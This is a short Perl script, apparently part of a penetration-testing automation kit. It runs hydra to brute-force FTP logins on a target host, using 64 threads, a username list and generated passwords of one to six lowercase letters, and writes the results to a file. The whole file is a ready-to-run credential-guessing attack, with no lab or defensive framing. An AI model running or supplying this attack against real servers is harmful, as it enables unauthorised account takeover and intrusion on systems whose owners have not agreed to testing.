#!/usr/bin/perl
use strict;
use warnings;

require("./shared.pm");
our(@TARGET, @OUTFOLDER, @SITES);

execute("hydra  -t 64 -e ns -u -L username_simple.lst -x 1:6:a -v @TARGET ftp 2>&1 | tee @OUTFOLDER/hydra/ftp_bruteforce_username_list_@TARGET.txt");
